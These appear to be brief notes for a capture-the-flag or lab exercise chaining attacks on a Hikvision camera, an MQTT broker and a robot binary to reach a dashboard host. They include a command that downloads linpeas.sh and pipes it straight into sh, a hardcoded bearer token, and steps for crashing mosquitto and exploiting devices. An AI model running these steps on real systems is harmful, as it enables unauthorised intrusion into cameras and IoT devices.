(no need to ssh camera)
look at dashboard to see what happen
1. Find camera ip and port to find hikvision running
2. find version of hikvision on '/' page of camera
3. Exploit to get black screenshop (./tools/hikvision/attack-hikvision.py), and config with credentials of operator
4. Use these credentials of operator to enter in dashboard server with ssh `ssh operator@localhost -p 22222`

(dashboard)
# light
- make mosquitto crash on it
- attack file .attack.py
- might be slow so stop it manually

(dashboard)
# next
`curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
- next route with ENV and /next
we can try but see that dashboard does not resolve, not problem we have the ip
`http get http://localhost:1880/next --headers [Authorization "Bearer 0c497d24da14cde5f5b947f7920d4df20189d9b1ad3302b9b31afd1ec1918f1b"]`

(dashboard)
# robot
- find robot
- decompile with `nix-shell -p binutils` + `objdump -o robot`

5. On the server, find token in ENV and route /next in .bash_history
6. Make mosquitto crash to turn on the light
7. exploit c file to control the robot and make it go further

light
can use `mosquitto_pub -h localhost -t light/control -m "off"` to sned message
